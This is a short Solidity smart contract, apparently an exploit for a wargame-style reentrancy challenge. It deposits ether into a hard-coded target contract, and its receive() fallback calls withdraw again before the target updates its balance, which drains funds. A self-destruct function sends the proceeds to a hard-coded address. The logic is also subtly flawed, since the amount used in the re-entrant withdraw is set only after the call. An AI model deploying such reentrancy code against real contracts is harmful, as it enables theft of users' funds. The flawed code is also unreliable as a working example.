pragma solidity ^0.8.7;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface Hack {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint balance);
    function withdraw(uint _amount) external;
}

contract DoReentrance {
    using SafeMath for uint256;
    uint counter = 0;
    uint stage = 0;
    uint initialAmountHolder;
    address targetContract = payable(0xa607F215ea445dC53EA820079C283cC6009D8B40);
    address myAddress = 0x0446B79FD7cea4452420FCaf100814aeEcB53d34;

    function getStage() external view returns (uint) {
        return stage;
    }
    function getCounter() external view returns (uint) {
        return counter;
    }

    function chooseToSelfDestruct(address mine) public {
        mine = 0x0446B79FD7cea4452420FCaf100814aeEcB53d34;
        payable(mine).transfer(address(this).balance);
        selfdestruct(payable(mine));
    }

    function depositAndHack(uint initialAmount) public payable {
        stage = 1;
        Hack(targetContract).donate{value: initialAmount, gas: 150000}(myAddress);
        stage = 2;
        Hack(targetContract).withdraw(initialAmount);
        stage = 7;
        initialAmountHolder = initialAmount;
        stage = 8;
    }

    receive() external payable {
        stage = 3;
        if (counter < 1) {
            counter++;
            stage = 4;
            Hack(targetContract).withdraw(initialAmountHolder);
            stage = 5;
        }
        stage = 6;
        counter = 0;
    }
}

